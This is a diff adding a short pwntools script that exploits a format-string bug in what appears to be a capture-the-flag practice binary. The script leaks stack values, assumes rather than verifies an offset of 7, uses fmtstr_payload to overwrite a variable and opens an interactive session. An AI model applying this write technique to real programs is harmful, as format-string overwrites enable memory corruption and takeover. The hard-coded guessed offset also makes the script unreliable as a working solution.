@@ -82,3 +82,37 @@
  'binary.\n'
  '- This exploit assumes that the target machine has the same architecture and '
  "environment as the one where you're running the exploit.")
+
+from pwn import *
+
+# Load the ELF binary
+elf = ELF('./pwn/string/fmt-1/fmt1')
+
+# Get the address of the variable 'x'
+x_addr = elf.symbols['x']
+
+# Start the process
+p = process('./pwn/string/fmt-1/fmt1')
+
+# Optional: Uncomment the following line if you need to debug
+# gdb.attach(p, gdbscript='b *main')
+
+# Determine the format string offset
+# Send a format string to leak stack addresses
+p.sendline('%p ' * 10)
+leaks = p.recvline().decode().strip().split()
+for i, leak in enumerate(leaks):
+    print(f'Position {i}: {leak}')
+
+# From the output, determine the correct offset where our input is placed
+# For this example, let's assume the offset is 7
+offset = 7
+
+# Create the payload to write the value 4 to x_addr
+payload = fmtstr_payload(offset, {x_addr: 4})
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
